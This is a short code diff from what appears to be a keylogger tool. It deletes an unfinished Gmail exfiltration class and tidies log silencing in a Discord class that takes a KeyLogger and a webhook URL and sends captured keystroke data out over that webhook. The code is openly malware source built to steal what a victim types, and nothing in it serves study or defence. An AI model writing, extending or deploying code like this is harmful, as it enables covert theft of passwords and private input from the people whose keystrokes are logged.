@@ -53,14 +53,6 @@ class TextFile(Exfiltrator):
                 file.write(reporting.get_logs())
 
 
-class Gmail(Exfiltrator):
-    def __init__(self, *, subject: KeyLogger, host_name: str = None):
-        super().__init__(subject, host_name)
-
-    def update(self, data: Collection[str]):
-        ...
-
-
 class Discord(Exfiltrator):
     def __init__(self, *,
                  subject: KeyLogger,
@@ -68,9 +60,9 @@ class Discord(Exfiltrator):
                  webhook_url: str):
         super().__init__(subject, host_name)
         self.webhook_url = webhook_url
-        # Prevent asyncio from spamming the server with DEBUG logging
-        logging.getLogger("asyncio").setLevel(logging.CRITICAL)
-        logging.getLogger("discord.webhook").setLevel(logging.CRITICAL)
+        # Prevent asyncio and webhook from spamming the logs
+        for logger in "asyncio", "discord.webhook":
+            logging.getLogger(logger).setLevel(logging.CRITICAL)
 
     def update(self, data: Collection[str]) -> None:
         if len(data) > 0:
